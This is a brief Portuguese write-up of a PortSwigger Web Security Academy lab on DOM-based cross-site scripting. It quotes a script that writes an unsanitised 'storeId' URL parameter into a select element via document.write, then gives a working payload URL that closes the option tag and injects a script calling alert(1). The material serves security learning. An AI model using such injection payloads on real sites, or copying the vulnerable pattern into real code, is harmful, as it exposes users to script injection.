#ctf 

https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element

O script abaixo lança na DOM um `<select>` já com um valor selecionado por padrão.

```javascript

var stores = ["London", "Paris", "Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if (store) {
	document.write('<option selected>' + store + '</option>');
}

for (var i = 0; i < stores.length; i++) {
	if (stores[i] === store) {
		continue;
	}

	document.write('<option>' + stores[i] + '</option>');
}

document.write('</select>');
```

Na URL da página, é possível adicionar um parâmetro `storeId` e seu valor é setado no HTML com `document.write`. Então é só usar esse payload:

```
https://0a64000d0373c91a81ca701f0002006f.web-security-academy.net/product?productId=3&storeId=%3C/option%3E%3Cscript%3Ealert(1)%3C/script%3E
```

GG